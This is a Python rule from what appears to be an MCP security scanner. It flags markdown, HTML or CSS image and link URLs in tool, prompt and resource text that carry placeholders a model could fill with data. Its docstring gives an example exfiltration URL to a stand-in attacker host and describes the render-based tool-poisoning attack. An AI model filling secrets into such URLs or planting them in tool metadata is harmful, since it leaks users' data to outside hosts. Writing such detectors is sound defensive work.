"""MCP-TP-007: links or images whose rendering can leak data.

If a client renders markdown, an image URL like `https://attacker/p.png?d={secrets}` is fetched
automatically, and whatever the model filled into the URL leaves with the request. No click needed.
"""

from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlsplit

from mcpiranha.core.matching import MatchView
from mcpiranha.core.models import Category, Evidence, Finding, Severity
from mcpiranha.core.text import iter_text_fields
from mcpiranha.rules.base import Rule, RuleContext
from mcpiranha.rules.registry import register

_I = re.IGNORECASE
_MD_IMAGE = re.compile(r"!\[[^\]\n]{0,200}\]\(\s*<?(?P<url>https?://[^)\s>]+)", _I)
_HTML_IMAGE = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*['\"]?(?P<url>https?://[^'\"\s>]+)", _I)
_MD_LINK = re.compile(r"(?<!!)\[[^\]\n]{0,200}\]\(\s*<?(?P<url>https?://[^)\s>]+)", _I)
_CSS_URL = re.compile(r"\burl\(\s*[\'\"]?(?P<url>https?://[^\'\"\s)]+)", _I)
_PLACEHOLDER = re.compile(r"\{[^}]{0,80}\}|\$\{|%7B|<[A-Za-z_]{2,40}>|\[[A-Z_]{3,40}\]", _I)


def _public_cache_query(url: str) -> bool:
    """Only conventional numeric cache versions; arbitrary query values remain reportable."""
    try:
        pairs = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    except ValueError:
        return False
    return bool(pairs) and all(
        key.lower() in {"v", "ver", "version", "rev"}
        and re.fullmatch(r"v?[0-9]{1,12}(?:\.[0-9]{1,6}){0,3}", value)
        for key, value in pairs
    )


@register
class RenderExfiltration(Rule):
    id = "MCP-TP-007"
    title = "Exfiltration via rendered links or images"
    category = Category.TOOL_POISONING
    default_severity = Severity.HIGH
    applies_to = frozenset({"tool", "prompt", "resource"})
    remediation = (
        "Remove the image or link. A URL with a placeholder for the model to fill in sends that "
        "data to the URL's host as soon as the client renders it."
    )

    def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for tf in iter_text_fields(ctx.snapshot):
            if tf.kind in ("name", "uri", "property-name"):
                continue
            view = MatchView.of(tf.text)
            hits: list[tuple[Severity, str, Evidence]] = []
            for pattern, kind in (
                (_MD_IMAGE, "image"),
                (_HTML_IMAGE, "image"),
                (_CSS_URL, "CSS resource"),
                (_MD_LINK, "link"),
            ):
                for m, evidence in view.finditer(pattern):
                    url = m.group("url")
                    templated = bool(_PLACEHOLDER.search(url))
                    if kind == "link" and not templated:
                        continue  # plain links need a click and are everywhere in docs
                    if templated:
                        hits.append(
                            (Severity.HIGH, f"{kind} URL with a fill-in placeholder", evidence)
                        )
                    elif "?" in url and not _public_cache_query(url):
                        hits.append((Severity.MEDIUM, "image URL with a query string", evidence))
                    else:
                        hits.append((Severity.LOW, "remote image", evidence))
            if not hits:
                continue
            findings.append(
                self.finding(
                    location=tf.location,
                    evidence=[ev for _, _, ev in hits],
                    rationale=f"The {tf.kind} contains "
                    f"{'; '.join(sorted({label for _, label, _ in hits}))}.",
                    severity=max((s for s, _, _ in hits), key=lambda s: s.rank),
                )
            )
        return findings
